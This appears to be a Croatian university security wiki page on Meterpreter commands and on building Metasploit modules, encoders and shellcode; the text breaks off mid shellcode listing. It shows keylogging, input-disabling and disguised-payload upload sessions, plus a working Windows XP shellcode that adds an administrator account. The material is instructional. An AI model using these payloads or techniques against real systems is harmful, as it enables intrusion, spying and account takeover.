+<p>Meterpreter je napredni, dinamički proširivi payload koji koristi DLL injection stagers unutar memorije te se proširi kroz čitavu mrežu prilikom upotrebe. Komunicira preko stager socketa i pruža sveobuhvatan Ruby API na klijentskoj strani. Značajke su mu da ima naredbenu povijest, završetak kartice (engl. tab completion) kanale i još mnogo toga. Meterpreter je izvorno napisan od skape???? za Metasploit 2.x, zajedničke ekstenzije su spojene za 3.x te se trenutno prolazi remont za Metasploit 3.3. Serverski dio je implementiran u čistom C-u te se sada kompajlira sa MSCV, čineći ga ponešto prenosivim. Klijent se može napisati u bilo kojem jeziku, ali Metasploit sadrži potpuno opremljeni Ruby klijent API. 
+</p><p><br />
+Kada se pokuša eksploatirati udaljeni sustav, napadač uvijek ima specifične ciljeve na umu – obično, da dobije naredbenu ljusku udaljenog sustava, a time i pokretanje proizvoljnih naredbi na tom sustavu. Napadač bi također želio da to učini u što je više moguće skrivenim načinom, kao i izbjegavanje bilo kakvih sustava za otkrivanje upada (IDSs). 
+<br />
+Ako je eksploatacija uspješna, ali naredbena ljuska prestane raditi, ili se izvršava u zatvorenom okruženju, napadačeve opcije će biti teško ograničene. To znači da pokretanje novog procesa na udaljenom sustavu rezultira u visoko vidljivoj situaciji, gdje bi dobar administrator ili forenzički analitičar, koji bi prvo provjerio listu pokrenutih procesa na sumnjivom sustavu, primjetio novi proces – i to je jedna od stvari koje napadač ne želi da se dogode. 
+<br />
+Tek se tada u posao uključuje Meterpreter (skraćeno za Meta-Interpreter). Meterpreter je jedan od naprednijih payloada dostupnih sa MSF-om , ali se ne bi trebalo na njega gledati kao običan payload, već prije kao exploit platforma koja se izvršava na udaljenom sustavu. Meterpreter ima svoju vlastitu naredbenu ljusku, koja napadaču pruža široki spektar aktivnosti koje se mogu izvršiti na eksploatiranom sustavu. Dodatno, Meterpreter dozvoljava programerima pisanje svojih vlastitih ekstenzija u formi DLL datoteka, koje se mogu uploadati i izvršiti na udaljenim sustavima. Dakle, bilo koji programski jezik u kojem se programi mogu kompajlirati u DLL-ove se može koristiti za razvoj Meterpreter ekstenzija. 
+<br />
+Međutim, prava ljepota Meterpretera leži u tome da može raditi kada sam sebe ubrizga u ranjive pokrenute procese na udaljenom sustavu, kada se pojavi eksploatacija. Sve naredbe idu kroz Meterpreter i također se izvršavaju unutar konteksta pokrenutog procesa. Na taj način je u stanju da izbjegne otkrivanje od strane bilo kakvog antivirusnog sustava ili osnovnih forenzičkih ispitivanja. 
+</p>
+<h4> <span class="mw-headline" id="Osnovne_komande">Osnovne komande</span></h4>
+<h5> <span class="mw-headline" id=".3F.2C_help">?, help</span></h5>
+<p>Pokretanjem ove naredbe dobiva se popis naredbi sa kratim objašnjenjem svake naredbe.
+</p>
+<h5> <span class="mw-headline" id="background">background</span></h5>
+<p>Ovom naredbom pauzira se trenutna sesija Meterpreter-a te se prebacuje u metasploit konzolu.
+</p>
+<h5> <span class="mw-headline" id="channel">channel</span></h5>
+<p>Prikazuje informacije o aktivnim kanalima.
+</p>
+<h5> <span class="mw-headline" id="close">close</span></h5>
+<p>Naredba koja služi za zatvaranje određenog kanala.
+</p>
+<h5> <span class="mw-headline" id="exit.2C_quit">exit, quit</span></h5>
+<p>Naredba pomoću koje se zatvara trenutna sesija te se vraća u metasploit konzolu.
+</p>
+<h5> <span class="mw-headline" id="interact">interact</span></h5>
+<p>Naredba za interakciju sa nekim kanalom.
+</p>
+<h5> <span class="mw-headline" id="irb">irb</span></h5>
+<p>Naredba irb služi za pokretanje interaktivnog shell-a programskog jezika Ruby.
+Na taj način se skriptni jezik Ruby može koristiti za interakciju sa kompromitiranim računalom.
+</p>
+<h5> <span class="mw-headline" id="migrate">migrate</span></h5>
+<p>Meterpreter se inicijalno izvršava unutar exploitiranog procesa ili kao poseban proces u nekim slučajevima.
+Ako se taj proces prekine iz nekog razloga, sesija Meterpretera će se zatvoriti.
+Zbog toga je dobra ideja Meterpreter sesiju prebaciti u neki drugi proces za koji je manje vjerojatno da će se zatvoriti, npr. u proces explorer.exe.
+</p>
+<h5> <span class="mw-headline" id="read">read</span></h5>
+<p>Služi za čitanje podataka sa nekog kanala.
+</p>
+<h5> <span class="mw-headline" id="run">run</span></h5>
+<p>Sa naredbom run se može izvršiti neka meterpreter skripta.
+</p>
+<h5> <span class="mw-headline" id="use">use</span></h5>
+<p>Sa naredbom use se mogu užitati ekstenzije za meterpreter koje onda pružaju mogućnost korištenja dodatnih naredbi i funkcionalnosti.
+Sa use -l možemo dobiti popis svih dostupnih ekstenzija.
+</p>
+<h5> <span class="mw-headline" id="write">write</span></h5>
+<p>Sa naredbom write se zapisuju podaci u određeni kanal.
+</p>
+<h4> <span class="mw-headline" id="File_system_commands">File system commands</span></h4>
+<h5> <span class="mw-headline" id="cat">cat</span></h5>
+<p>Naredba <i>cat</i> prikazuje sadržaj jedne datoteke. Ukoliko je datoteka prazna naredba <i>cat</i> će izbaciti pogrešku.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;cat passwords.txt&lt;/b&gt;&lt;/i&gt;
+harleydavidson
+password
+kidsbirthday
+</pre>
+<h5> <span class="mw-headline" id="cd">cd</span></h5>
+<p>Kako bi se promijenio direktorij koristi se naredba cd.
+Naredba prihvaća i slash i backslash putanje do direktorija naizmjenično, ali se češće koristi slash (/). 
+"." i ".." se koriste kako bi se pristupilo trenutnom i nadređenom direktoriju respektivno, te se dvostruke točke mogu koristiti za pristup direktorijima sa razmakom u nazivu.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;pwd&lt;/b&gt;&lt;/i&gt;
+C:\
+meterpreter &gt; &lt;i&gt;&lt;b&gt;cd /&quot;Program Files&quot;/&quot;Internet Explorer&quot;&lt;/b&gt;&lt;/i&gt;
+meterpreter &gt; &lt;i&gt;&lt;b&gt;pwd&lt;/b&gt;&lt;/i&gt;
+C:\Program Files\Internet Explorer
+meterpreter &gt; &lt;i&gt;&lt;b&gt;cd ../../&quot;documents and settings&quot;/Administrator/Desktop/&lt;/b&gt;&lt;/i&gt;
+C:\Documents and Settings\Administrator\Desktop
+</pre>
+<h5> <span class="mw-headline" id="download">download</span></h5>
+<p>Kada trebamo dohvatiti datoteku iz cilja, koristimo naredbu download, koja prenosi određenu datoteku u naš lokalni radni direktorij. U slučaju da trebamo rekurzivno preuzeti cijeli direktorij
+ onda koristimo naredbu download -r.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;download users.txt&lt;/b&gt;&lt;/i&gt;
+[*] downloading: users.txt -&gt; users.txt
+[*] downloaded&#160;: users.txt -&gt; users.txt
+</pre>
+<h5> <span class="mw-headline" id="edit">edit</span></h5>
+<p>Ukoliko želimo urediti datoteku koristeći zadani tekst editor koristit ćemo naredbu edit. U pozadini, Meterpreter će preuzeti kopiju datoteke u privremeni (temp) direktorij, te potom uploadati novu datoteku kad se završi sa uređivanjem. </p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;edit users.txt&lt;/b&gt;&lt;/i&gt;
+</pre>
+<h5> <span class="mw-headline" id="getlwd">getlwd</span></h5>
+<p>Možemo pirkazati trenutni radni direktorij na anšem lokalnom računalu koristeći naredbu getlwd (dohvaća lokalni radni direktorij) ili koristeći alisa,naredbu lpwd (lokalni print radni direktorij)</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;getlwd&lt;/b&gt;&lt;/i&gt;
+/home/myusername/Desktop/metasploit
+meterpreter &gt; &lt;i&gt;&lt;b&gt;lpwd&lt;/b&gt;&lt;/i&gt;
+/home/myusername/Desktop/metasploit
+</pre>
+<h5> <span class="mw-headline" id="getwd">getwd</span></h5>
+<p>Možemo prikazati trenutni radni direktorij na eksploatiranom računalu koristeći naredbu getwd (dohvaća radni direktorij) ili koristeći alias naredbu pwd (ispiši radni direktorij)</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;getwd&lt;/b&gt;&lt;/i&gt;
+C:\Program Files\Internet Explorer
+meterpreter &gt; &lt;i&gt;&lt;b&gt;pwd&lt;/b&gt;&lt;/i&gt;
+C:\Program Files\Internet Explorer
+</pre>
+<h5> <span class="mw-headline" id="lcd">lcd</span></h5>
+<p>Kako bi promjenili lokalni direktorij koristimo naredbu lcd.
+Naredba prima argumente samo na isti način kao i što radi naredba cd na našem OS-u, tako da su specifični upute ove naredbe dostupne i u dokumentaciji sustava. Sljedeći primjer prikazuje naredbu
+lcd na Linux sustavu.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;lpwd&lt;/b&gt;&lt;/i&gt;
+/home/myusername/Desktop/metasploit
+meterpreter &gt; &lt;i&gt;&lt;b&gt;lcd ../..&lt;/b&gt;&lt;/i&gt;
+meterpreter &gt; &lt;i&gt;&lt;b&gt;lpwd&lt;/b&gt;&lt;/i&gt;
+/home/myusername
+meterpreter &gt; &lt;i&gt;&lt;b&gt;lcd /home/andrer/Desktop/metasploit&lt;/b&gt;&lt;/i&gt;
+meterpreter &gt; &lt;i&gt;&lt;b&gt;lpwd&lt;/b&gt;&lt;/i&gt;
+/home/myusername/Desktop/metasploit
+</pre>
+<h5> <span class="mw-headline" id="lpwd">lpwd</span></h5>
+<p>Sa ovom naredbom se može prikazati trenutni radni direktorij na našem lokalnom računallu (ispis lokalnog radnog direktorija). Isto se može ostvariti koristeći alias ove naredbe, naredbu getlwd (dohvati lokalni radni direktorij).</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;lpwd&lt;/b&gt;&lt;/i&gt;
+/home/myusername/Desktop/metasploit
+meterpreter &gt; &lt;i&gt;&lt;b&gt;getlwd&lt;/b&gt;&lt;/i&gt;
+/home/myusername/Desktop/metasploit
+</pre>
+<h5> <span class="mw-headline" id="ls">ls</span></h5>
+<p>Možemo vidjeti i trenutni radni direktorij i detaljan opis datoteka u tom direktoriju koristeći naredbu ls. Izlistaji datoteka su dati u obliku sličnom programu GNU ls.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;ls&lt;/b&gt;&lt;/i&gt;
+
+Listing: C:\Documents and Settings\Administrator\Desktop\shared
+===============================================================
+
+Mode              Size   Type  Last modified                   Name               
+----              ----   ----  -------------                   ----               
+40777/rwxrwxrwx   0      dir   Wed Dec 31 18:00:00 -0600 1969  .                  
+40777/rwxrwxrwx   0      dir   Wed Dec 31 18:00:00 -0600 1969  ..                 
+100777/rwxrwxrwx  14965  fil   Wed Dec 31 18:00:00 -0600 1969  meter-443.exe  
+40777/rwxrwxrwx   0      dir   Wed Dec 31 18:00:00 -0600 1969  u3
+</pre>
+<h5> <span class="mw-headline" id="mkdir">mkdir</span></h5>
+<p>ova naredba se koristi kako bi se stvorio novi direktorij na ciljnom sustavu. </p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;mkdir antivirus-update&lt;/b&gt;&lt;/i&gt;
+Creating directory: antivirus-update
+meterpreter &gt; &lt;i&gt;&lt;b&gt;ls&lt;/b&gt;&lt;/i&gt;
+
+Listing: C:\Documents and Settings\Administrator\Desktop
+================================================
+
+Mode              Size     Type  Last modified                   Name               
+----              ----     ----  -------------                   ----               
+40777/rwxrwxrwx   0        dir   Wed Dec 31 18:00:00 -0600 1969  .                  
+40777/rwxrwxrwx   0        dir   Wed Dec 31 18:00:00 -0600 1969  ..                 
+40777/rwxrwxrwx   0        dir   Wed Dec 31 18:00:00 -0600 1969  antivirus-update   
+40777/rwxrwxrwx   0        dir   Wed Dec 31 18:00:00 -0600 1969  shared             
+40777/rwxrwxrwx   0        dir   Wed Dec 31 18:00:00 -0600 1969  working
+</pre>
+<h5> <span class="mw-headline" id="pwd">pwd</span></h5>
+<p>Možemo prikazati trenutni radni direktorij na našem lokalnom računalu koristeći naredbu <i>pwd</i> (ispiši radni direktorij -print working directory) ili koristeći alias, naredbu <i>getwd</i>(dohvati radni direktorij - get working directory).</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;pwd&lt;/b&gt;&lt;/i&gt;
+C:\Program Files\Internet Explorer
+meterpreter &gt; &lt;i&gt;&lt;b&gt;getwd&lt;/b&gt;&lt;/i&gt;
+C:\Program Files\Internet Explorer
+</pre>
+<h5> <span class="mw-headline" id="rmdir">rmdir</span></h5>
+<p>Možemo takođe ukloniti prazan direktorij sa naredbom <i>mkdir</i>. Naredba će ispisati pogrešku ukoliko se radi o praznom direktoriju.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;rmdir antivirus-update&lt;/b&gt;&lt;/i&gt;
+Removing directory: antivirus-update
+</pre>
+<h5> <span class="mw-headline" id="upload">upload</span></h5>
+<p>Koristi se za slanje datoteke na ciljnom sustavu. Uz pomoć -r prekidača rekurzivno se uploadaju direktoriji i njeni sadržaji. U sljedećem primjeru uploadamo lažno imenovani Meterpreter payload.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;upload antivirus.exe&lt;/b&gt;&lt;/i&gt;
+[*] uploading &#160;: antivirus.exe -&gt; antivirus.exe
+[*] uploaded  &#160;: antivirus.exe -&gt; antivirus.exe
+meterpreter &gt; &lt;i&gt;&lt;b&gt;ls&lt;/b&gt;&lt;/i&gt;
+
+Listing: C:\Documents and Settings\Administrator\Desktop\antivirus-update
+=================================================================
+
+Mode              Size   Type  Last modified                   Name           
+----              ----   ----  -------------                   ----           
+40777/rwxrwxrwx   0      dir   Wed Dec 31 18:00:00 -0600 1969  .              
+40777/rwxrwxrwx   0      dir   Wed Dec 31 18:00:00 -0600 1969  ..             
+100777/rwxrwxrwx  10912  fil   Wed Dec 31 18:00:00 -0600 1969  antivirus.exe
+</pre>
+<h4> <span class="mw-headline" id="Networking_Commands">Networking Commands</span></h4>
+<h5> <span class="mw-headline" id="ipconfig">ipconfig</span></h5>
+<p>Koristeći naredbu ipconfig, drugačije rečeno konfiguraciju internet protokola, možemo pogledati popis svih mrežnih sučelja na ciljnom sustavu. Gledanje rezultata ispisa za ipconfig je najviše korisno ukoliko želimo odrediti u koje je mreže ciljni sustav direktno spojen. Primjerice, u dijelu ispod možemo vidjeti da je meta spojena na 192.168.50.0/24 sa unutarnjom adresom 192.168.50.100.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;ipconfig&lt;/b&gt;&lt;/i&gt;
+
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address &#160;: 127.0.0.1
+Netmask    &#160;: 255.0.0.0
+
+
+National Semiconductor DP83815-Based PCI Fast Ethernet Adapter - Packet Scheduler Miniport
+Hardware MAC: 00:0b:cd:30:db:0a
+IP Address &#160;: 192.168.50.100
+Netmask    &#160;: 255.255.255.0
+</pre>
+<h5> <span class="mw-headline" id="portfwd">portfwd</span></h5>
+<p>Prosljeđuje lokalni port nekom udaljenom servisu.</p>
+<h5> <span class="mw-headline" id="route">route</span></h5>
+<p>Koristi se za pregled i izmjenu tablice usmjeravanja.</p>
+<h4> <span class="mw-headline" id="System_commands">System commands</span></h4>
+<h5> <span class="mw-headline" id="execute">execute</span></h5>
+<p>Izvršava naredbu. Kako bi se izvršila naredba potrebno je koristiti execute "-f" za izvršnu datoteku "cmd.exe". Ovo će se odviti u pozadini. Kako bi provjerili ovo potrebo je utipkati ps execute -f cmd.exe 54124 ---&gt; ID procesa.</p>
+<h5> <span class="mw-headline" id="getpid">getpid</span></h5>
+<p>Koristi se za dohvaćanje trenutnog identifikatora procesa.</p>
+<h5> <span class="mw-headline" id="getuid">getuid</span></h5>
+<p>Dohvaća se server koji je pokrenut kao korisnik.</p>
+<h5> <span class="mw-headline" id="kill">kill</span></h5>
+<p>Terminira proces.</p>
+<h5> <span class="mw-headline" id="ps">ps</span></h5>
+<p>Naredba ps služi za ispis svih pokrenutih procesa te je važna naredba iz par razloga. Prvo, to je dobra ideja za nas kako bi bili svjesni aplikacija i servisa koji su pokrenuti s ciljem upozoravanja sustava. Drugo, Meterpreter je u početku pokrenut unutar eksploatiranog procesa ili u nekim slučajevim kao zaseban izvršni proces. Ukoliko se taj proces zaustavi iz bilo kojih razloga, Meterpreter sesija će se zatvoriti, tako da je dobra praksa preseliti sesiju na malo više stabilniji proces kao što je "Windows explorer.exe".</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;ps&lt;/b&gt;&lt;/i&gt;
+
+Process list
+============
+
+    PID   Name                      Path                                                     
+    ---   ----                      ----                                                     
+    284   MPFSrv.exe                C:\Program Files\McAfee\MPF\MPFSrv.exe                   
+    424   RalinkRegistryWriter.exe  C:\Program Files\RALINK\Common\RalinkRegistryWriter.exe  
+    492   smss.exe                  \SystemRoot\System32\smss.exe                            
+    592   winlogon.exe              \??\C:\WINDOWS\system32\winlogon.exe                     
+    612   WinVNC4.exe               C:\Program Files\RealVNC\VNC4\WinVNC4.exe                
+    636   services.exe              C:\WINDOWS\system32\services.exe                         
+    648   lsass.exe                 C:\WINDOWS\system32\lsass.exe                            
+    804   svchost.exe               C:\WINDOWS\system32\svchost.exe                          
+    876   NOTEPAD.EXE               C:\WINDOWS\system32\NOTEPAD.EXE                          
+    964   svchost.exe               C:\WINDOWS\System32\svchost.exe                          
+    1348  spoolsv.exe               C:\WINDOWS\system32\spoolsv.exe                          
+    1464  Explorer.EXE              C:\WINDOWS\Explorer.EXE                                  
+    1540  mcagent.exe               C:\Program Files\McAfee.com\Agent\mcagent.exe            
+    1612  RaUI.exe                  C:\Program Files\RALINK\Common\RaUI.exe                  
+    1840  McSACore.exe              C:\Program Files\McAfee\SiteAdvisor\McSACore.exe         
+    1852  mcmscsvc.exe              C:\PROGRA~1\McAfee\MSC\mcmscsvc.exe                      
+    1876  mcnasvc.exe               c:\PROGRA~1\COMMON~1\mcafee\mna\mcnasvc.exe              
+    1928  mcproxy.exe               c:\PROGRA~1\COMMON~1\mcafee\mcproxy\mcproxy.exe          
+    1952  mcshield.exe              C:\PROGRA~1\McAfee\VIRUSS~1\mcshield.exe                 
+    3028  wuauclt.exe               C:\WINDOWS\system32\wuauclt.exe                          
+    3168  wpabaln.exe               C:\WINDOWS\system32\wpabaln.exe                          
+    3240  mcsysmon.exe              C:\PROGRA~1\McAfee\VIRUSS~1\mcsysmon.exe
+</pre>
+<h5> <span class="mw-headline" id="reboot">reboot</span></h5>
+<p>Koristeći naredbu rebook, ciljni sustav se ponovo pokreće.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;reboot&lt;/b&gt;&lt;/i&gt;
+Rebooting...
+</pre>
+<h5> <span class="mw-headline" id="reg">reg</span></h5>
+<p>Služi za izmjenu i interakciju sa udaljenim regeistrom.</p>
+<h5> <span class="mw-headline" id="rev2self">rev2self</span></h5>
+<p>Poziva RevertToSelf() na udaljenom računalu.</p>
+<h5> <span class="mw-headline" id="shutdown">shutdown</span></h5>
+<p>Koristeći naredbu shutdown, ciljni sustav će se isključiti.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;shutdown&lt;/b&gt;&lt;/i&gt;
+Shutting down...
+</pre>
+<h5> <span class="mw-headline" id="sysinfo">sysinfo</span></h5>
+<p>Kroz post-eksploatacijsku fazu, jedna od najranijih naredbi koje bi trebali pokrenuti je naredba sysinfo. Pokretanje naredbe će nam dati ime račinala i verziju OS-a, koja ćešto nudi trag o svrsi ciljnog sustava.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;sysinfo&lt;/b&gt;&lt;/i&gt;
+Computer: TARGETLAPTOP
+OS     &#160;: Windows XP (Build 2600, Service Pack 2).
+</pre>
+<h4> <span class="mw-headline" id="User_Interface_Commands">User Interface Commands</span></h4>
+<h5> <span class="mw-headline" id="enumdesktops">enumdesktops</span></h5>
+<p>Ispisuje popis svih dostupnih desktop i windows stanica.</p>
+<h5> <span class="mw-headline" id="idletime">idletime</span></h5>
+<p>Koristeći naredbu idletime dohvaćamo duljinu vremena koje je korisnik ciljnog sustava bio u stanju mirovanja.</p>
+<pre>
+ meterpreter &gt; &lt;i&gt;&lt;b&gt;idletime&lt;/b&gt;&lt;/i&gt;
+ User has been idle for: 51 secs
+</pre>
+<h5> <span class="mw-headline" id="keyscan_dump">keyscan_dump</span></h5>
+<p>Možemo uhvatiti unos sa tipkovnice ciljnog sustava koristeći keyscan niz naredbi. Naredba keyscan_start i keyscan_stop će pokrenuti i završiti snimanje unosa sa tipkovnice,respektivno, dok naredba keyscan_dump prikazuje sve snimljene unose sa tipkovnice na našem klijentu.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;keyscan_start&lt;/b&gt;&lt;/i&gt;
+Starting the keystroke sniffer...
+meterpreter &gt; &lt;i&gt;&lt;b&gt;keyscan_dump&lt;/b&gt;&lt;/i&gt;
+Dumping captured keystrokes...
+This text is actually being typed into the target's keyboard.&lt;Return&gt; 
+meterpreter &gt; &lt;i&gt;&lt;b&gt;keyscan_stop&lt;/b&gt;&lt;/i&gt;
+Stopping the keystroke sniffer...
+</pre>
+<h5> <span class="mw-headline" id="keyscan_start">keyscan_start</span></h5>
+<p>Možemo uhvatiti unos sa tipkovnice ciljnog sustava koristeći keyscan niz naredbi. Naredba keyscan_start i keyscan_stop će pokrenuti i završiti snimanje unosa sa tipkovnice,respektivno, dok naredba keyscan_dump prikazuje sve snimljene unose sa tipkovnice na našem klijentu.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;keyscan_start&lt;/b&gt;&lt;/i&gt;
+Starting the keystroke sniffer...
+meterpreter &gt; &lt;i&gt;&lt;b&gt;keyscan_dump&lt;/b&gt;&lt;/i&gt;
+Dumping captured keystrokes...
+This text is actually being typed into the target's keyboard.&lt;Return&gt; 
+meterpreter &gt; &lt;i&gt;&lt;b&gt;keyscan_stop&lt;/b&gt;&lt;/i&gt;
+Stopping the keystroke sniffer...
+</pre>
+<h5> <span class="mw-headline" id="keyscan_stop">keyscan_stop</span></h5>
+<p>Možemo uhvatiti unos sa tipkovnice ciljnog sustava koristeći keyscan niz naredbi. Naredba keyscan_start i keyscan_stop će pokrenuti i završiti snimanje unosa sa tipkovnice,respektivno, dok naredba keyscan_dump prikazuje sve snimljene unose sa tipkovnice na našem klijentu.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;keyscan_start&lt;/b&gt;&lt;/i&gt;
+Starting the keystroke sniffer...
+meterpreter &gt; &lt;i&gt;&lt;b&gt;keyscan_dump&lt;/b&gt;&lt;/i&gt;
+Dumping captured keystrokes...
+This text is actually being typed into the target's keyboard.&lt;Return&gt; 
+meterpreter &gt; &lt;i&gt;&lt;b&gt;keyscan_stop&lt;/b&gt;&lt;/i&gt;
+Stopping the keystroke sniffer...
+</pre>
+<h5> <span class="mw-headline" id="setdesktop">setdesktop</span></h5>
+<p>Premještanje na drugu radnu stanicu i desktop.</p>
+<h5> <span class="mw-headline" id="uictl">uictl</span></h5>
+<p>Koristeći naredbu uictl imamo mogućnost onemogućavanja unosa tipkovnice i mišta na ciljnom sustavu.</p>
+<pre>
+meterpreter &gt; &lt;i&gt;&lt;b&gt;uictl disable mouse&lt;/b&gt;&lt;/i&gt;
+Disabling mouse...
+meterpreter &gt; &lt;i&gt;&lt;b&gt;uictl enable mouse&lt;/b&gt;&lt;/i&gt;
+Enabling mouse...
+meterpreter &gt; &lt;i&gt;&lt;b&gt;uictl disable keyboard&lt;/b&gt;&lt;/i&gt;
+Disabling keyboard...
+meterpreter &gt; &lt;i&gt;&lt;b&gt;uictl enable keyboard&lt;/b&gt;&lt;/i&gt;
+Enabling keyboard...
+</pre>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Ndugandzi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Ndugandzi (stranica ne postoji)">Ndugandzi</a> 09:17, 20. siječnja 2013. (CET)
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Krudjuras&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Krudjuras (stranica ne postoji)">Krudjuras</a> 11:57, 19. siječnja 2013. (CET)
+</p>
+<h2> <span class="mw-headline" id="Izrada_modula_za_MSF">Izrada modula za MSF</span></h2>
+<p>Kod verzije 4.5 MSF-a moduli se nalaze u direktoriju /opt/metasploit-4.5.0/apps/pro/msf3/modules/
+Moduli za Metasploit Framework se pišu u skriptnom jeziku Ruby.
+</p><p>Kod kreiranja novih modula moguće je koristiti već postojeće module, kombinirati postojeće module i sl. jer je cijeli Metasploit framework pisan tako da bude vrlo modularan i da se većina postojećeg kod može ponovo iskoristiti.
+</p>
+<h3> <span class="mw-headline" id="Izrada_exploitova">Izrada exploitova</span></h3>
+<p>Osnovna struktura exploit modula je sljedeća
+</p>
+<pre>
+    header and some dependencies
+        Some comments about the exploit module
+        require ‘msf/core’
+    class definition
+    includes
+    “def” definitions&#160;:
+        initialize
+        check (optional)
+        exploit
+</pre>
+<h4> <span class="mw-headline" id="Fuzzing">Fuzzing</span></h4>
+<p>Fuzzer je program koji pokušava otkriti sigurnone ranjivosti slanjem slučajnih inputa nekoj aplikaciji. Ukoliko program sadrži ranjivosti koje mogu dovesti do iznimki, pada ili serverske greške (u slučaju web aplikacija), može se utvrditi daje ranjivost otkrivena. Fuzzeri se često nazivaju Fault Injectors (pogrešnim ubrizgavačima) jer generiraju smetnje i šalju ih prema nekoj aplikaciji. Općenito fuzzeri su dobi prilikom pronalaženja prekoračenja buffera, DoS, SQL Injection, XSS i Format String bugovi. Oni čine loš posao prilikom pronalaženja ranjivosti koje ne uzrokuju rušenje programa. 
+</p>
+<h3> <span class="mw-headline" id="Izrada_encodera">Izrada encodera</span></h3>
+<p>Kod izrade novog encodera cilj je da se kreira novi način kodiranja koji bi trebao smanjiti vjerojatnost detekcije palyoada i povećati vjerojatnost njegovog uspješnog izvršenja. Postoji više vrsta encodore, a primjer izvornog koda jednog jednostavnog encodera prikazan je u nastavku
+</p>
+<h3> <span class="mw-headline" id="Izrada_payloadova">Izrada payloadova</span></h3>
+<p>Kod izrade payloadova u biti se izrađuje koristan teret koji će se izvršiti ako se računalo uspješno exploita. To većinom uključuje pisanje shellcodeova, a to pretpostavlja dobro poznavanja programiranja u assembleru i dobro poznavanje operacijskog sustava koji se exploita jer se shellcodovi razlikuju čak i po verzijama Service Packova za Windowse.
+</p><p>Sljedeći shellcode dodaje novog korisnika sa administratorskim ovlastima na operacijskom sustavu Windows XP SP3 (32-bitna engleska verzija).
+</p>
+<pre>
+char code[] =   &quot;\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xad\x23&quot;
+                &quot;\x86\x7c\xff\xd3\x31\xc0\x50\xbb\xfa\xca&quot;
+                &quot;\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63&quot;
+                &quot;\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20&quot;
+                &quot;\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x73&quot;
+                &quot;\x65\x63\x75\x69\x64\x30\x20\x6d\x30\x6e&quot;
+                &quot;\x6b\x20\x2f\x61\x64\x64\x20\x26\x26\x20&quot;
+                &quot;\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67&quot;
+                &quot;\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e&quot;
+                &quot;\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20&quot;
+                &quot;\x73\x65\x63\x75\x69\x64\x30\x20\x2f\x61&quot;
+                &quot;\x64\x64\x00&quot;;
+</pre>
+<h4> <span class="mw-headline" id="Shellcode">Shellcode</span></h4>
+<p>U računalnoj sigurnosti, shellcode je mali dio koda koji se koristi kao payload prilikom eksploatacije ranjivosti softwarea. Naziva se "shellcode" (kod iz ljuske) jer obično pokreće naredbenu ljusku sa koje napadač može kontrolirati kompromitirano računalo, ali se i svaki komad koda koji obavlja slične zadatke može nazvati shellcode. 
+</p>
+<h4> <span class="mw-headline" id="Postupak_izrade_vlastitog_shellcodea">Postupak izrade vlastitog shellcodea</span></h4>
+<p>Za izradu vlastitog shellcode-a potrebno je poznavati assembler i operacijski sustav za koji se piše shellcode. U nastavku je dan opis kreiranje command execution shellcodea za Windows XP SP2 os (slično je i za druge verzija Windows OS-a, samo se korištene funkcije operacijskog sustava nalaze na drugim memorijskim lokacijama pa je potrebno promijeniti te adrese u assembler kodu).
+</p><p>Sljedeći assembler kod može nam poslužiti za kreiranje shellcodea koji kod izvršavanja pokreće notepad. Adrese WinExec i ExitProcess koje su korištene u assembler kodu odnose se Windows XP SP2 en.
+</p>
+<pre>
+[Section .text]
+
+BITS 32
+
+global _start
+
+_start:
+
+jmp short GetCommand
+CommandReturn:
+    pop ebx&#160;;ebx now points to the string
+
+    xor eax,eax
+    push eax
+    push ebx
+    mov ebx,0x7c8615b5&#160;;place address of WinExec into ebx
+    call ebx
+
+    xor eax,eax
+    push eax
+    mov ebx, 0x7c81ca82&#160;;place address of ExitProcess into ebx
+    call ebx
+
+GetCommand:
+    call CommandReturn
+    db &quot;cmd.exe /c notepad&quot;
+    db 0x00
+</pre>
+<p>Datoteka se može spremiti pod imenom 1.asm, i nakon toga u linux terminalu upišemo naredbu
+</p>
+<pre>
+nasm -f bin -o notepad.bin notepad.asm
+</pre>
+<p>Da bismo dobili shellcode moramo iskoristiti naredbu
+</p>
+<pre>
+xxd -i notepad.bin 
+</pre>
+<p>Time se dobiva sljedeći shellcode
+</p>
+<pre>
+  0xeb, 0x16, 0x5b, 0x31, 0xc0, 0x50, 0x53, 0xbb, 0xb5, 0x15, 0x86, 0x7c,
+  0xff, 0xd3, 0x31, 0xc0, 0x50, 0xbb, 0x82, 0xca, 0x81, 0x7c, 0xff, 0xd3,
